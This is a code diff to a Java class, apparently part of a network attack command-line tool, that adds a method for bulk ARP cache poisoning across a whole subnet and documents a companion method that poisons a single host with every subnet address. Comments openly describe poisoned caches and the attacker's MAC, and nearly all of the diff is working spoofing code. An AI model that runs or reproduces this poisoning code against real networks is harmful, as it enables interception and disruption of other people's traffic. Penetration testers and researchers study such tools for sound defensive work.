@@ -1,6 +1,7 @@
 package io.gl4dius.cli.module.arp;
 
 import io.gl4dius.cli.model.dto.Ipv4Subnet;
+import io.gl4dius.cli.service.NetDiscoveryService;
 import io.gl4dius.cli.utility.NetInterfaceUtil;
 import lombok.RequiredArgsConstructor;
 import lombok.extern.slf4j.Slf4j;
@@ -28,6 +29,8 @@ public class ArpSender {
     private static final int TIMEOUT_MS = 10;
 
     private static final MacAddress UNKNOWN_MAC = MacAddress.getByName("00:00:00:00:00:00");
+
+    private final NetDiscoveryService netDiscoveryService;
 
     /**
      * Sends a unicast ARP reply directly to a specific target.
@@ -60,6 +63,96 @@ public class ArpSender {
         }
     }
 
+    /**
+     * Sends ARP reply packets to all host addresses within the given IPv4 subnet,
+     * advertising the specified sender IP as being at the specified sender MAC address.
+     * <p>
+     * MAC address resolution is attempted for each target host via {@link NetDiscoveryService}.
+     * Hosts whose MAC address cannot be resolved are skipped with a warning. The sender itself
+     * (matched by IP or MAC) is also skipped to avoid self-poisoning.
+     * <p>
+     * A brief pause is introduced every 100 packets to avoid overwhelming the network interface.
+     * The operation is interruptible — if the calling thread is interrupted, sending stops
+     * gracefully without throwing an exception.
+     *
+     * @param networkInterface the name of the network interface to send packets on (e.g. {@code "eth0"})
+     * @param senderIp         the IP address to advertise in the ARP reply as the sender protocol address;
+     *                         may be {@code null} if the underlying pcap layer accepts it
+     * @param senderMacAddress the MAC address to associate with {@code senderIp} in poisoned ARP caches
+     * @param ipv4Subnet       the subnet whose host addresses will be iterated as ARP reply targets;
+     *                         must not be {@code null}
+     * @throws Exception if the network interface cannot be opened, or if a packet cannot be sent
+     */
+    public void sendBulkArpReply(String networkInterface,
+                                 String senderIp, String senderMacAddress,
+                                 @NonNull Ipv4Subnet ipv4Subnet) throws Exception {
+
+        PcapNetworkInterface nif = NetInterfaceUtil.findInterface(networkInterface);
+        Inet4Address senderAddr = (Inet4Address) InetAddress.getByName(senderIp);
+        MacAddress senderMac = MacAddress.getByName(senderMacAddress);
+
+        int sent = 0;
+        try (PcapHandle handle = nif.openLive(SNAP_LEN, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, TIMEOUT_MS)) {
+            for (var targetIp : ipv4Subnet.hosts()) {
+                if (Thread.currentThread().isInterrupted()) {
+                    return;
+                }
+
+                var targetAddr = (Inet4Address) InetAddress.getByName(targetIp);
+                var targetMacOptional = this.netDiscoveryService.resolveNeighborMacAddress(networkInterface, targetIp)
+                        .map(MacAddress::getByName);
+                if (targetMacOptional.isEmpty()) {
+                    log.warn("Failed to resolve MAC address for target IP {}, skipped sending ARP reply", targetIp);
+                    continue;
+                }
+
+                var targetMac = targetMacOptional.get();
+
+                if (targetIp.equals(senderIp) || targetMac.toString().equals(senderMac.toString())) {
+                    continue;
+                }
+
+                var packet = buildArpFrame(ArpOperation.REPLY, targetMac,
+                        senderMac, senderAddr,
+                        targetMac, targetAddr);
+
+                handle.sendPacket(packet);
+                log.debug("ARP reply sent: {}({}) -> {}({})", senderIp, senderMac, targetIp, UNKNOWN_MAC);
+
+                sent++;
+                if (sent % 100 == 0) {
+                    log.debug("Sent {} ARP replies", sent);
+                    LockSupport.parkNanos(10_000_000);
+                }
+            }
+        }
+    }
+
+    /**
+     * Sends ARP reply packets to a single target host, cycling through all host addresses
+     * in the given IPv4 subnet as the advertised sender IP — each paired with the same
+     * sender MAC address.
+     * <p>
+     * This is the inverse of
+     * {@link #sendBulkArpReply(String, String, String, Ipv4Subnet)}: rather than
+     * poisoning many hosts with one sender IP, it poisons one host with many sender IPs,
+     * causing the target to associate every subnet host address with {@code senderMacAddress}
+     * in its ARP cache.
+     * <p>
+     * The target IP is skipped if it appears in the subnet host range to avoid
+     * sending a self-referential ARP reply. A brief pause is introduced every 100 packets
+     * to avoid overwhelming the network interface. The operation is interruptible — if the
+     * calling thread is interrupted, sending stops gracefully without throwing an exception.
+     *
+     * @param networkInterface the name of the network interface to send packets on (e.g. {@code "eth0"})
+     * @param ipv4Subnet       the subnet whose host addresses will be iterated as advertised sender IPs;
+     *                         must not be {@code null}
+     * @param senderMacAddress the MAC address advertised as the sender in every ARP reply,
+     *                         typically the attacker's MAC
+     * @param targetIp         the IP address of the host whose ARP cache will be poisoned
+     * @param targetMacAddress the MAC address of the target host, used as the Ethernet destination
+     * @throws Exception if the network interface cannot be opened, or if a packet cannot be sent
+     */
     public void sendBulkArpReply(String networkInterface,
                                  @NonNull Ipv4Subnet ipv4Subnet, String senderMacAddress,
                                  String targetIp, String targetMacAddress) throws Exception {
@@ -93,7 +186,7 @@ public class ArpSender {
 
                 if (sent % 100 == 0) {
                     log.debug("Sent {} ARP replies", sent);
-                    LockSupport.parkNanos(1_000_000);
+                    LockSupport.parkNanos(10_000_000);
                 }
             }
         }
